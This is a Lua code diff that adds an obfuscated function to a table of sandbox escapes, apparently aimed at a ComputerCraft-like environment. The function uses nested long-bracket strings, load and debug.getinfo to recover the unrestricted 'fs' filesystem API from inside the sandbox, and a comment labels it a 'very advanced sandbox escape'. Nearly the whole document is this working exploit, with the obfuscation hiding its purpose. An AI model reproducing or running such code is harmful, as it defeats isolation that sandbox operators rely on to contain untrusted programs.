@@ -48,6 +48,20 @@ local escapes = {
         local k = dgetfenv(load("")).fs
         if is_probably_filesystem(k) then return k end
     end,
+    equals = function()
+        -- very advanced sandbox escape
+        local k=load[=================[
+        local _=({load[=======[local _;
+        return pcall(load[=[return load
+        ]=][=[=]=],function()_=load[==[
+        return debug.getinfo(#[=[===]=]
+        ).func[=[return fs]=][=[]=]]==]
+        [=[]=]end),_]=======][=[==]=]})
+        [#[=======[==]=======]]return _
+        ]=================][===[==]===]
+        
+        if is_probably_filesystem(k) then return k end
+    end,
     getfenv = function()
         for _, v in pairs(fs) do
             local res = scan_environment(v)
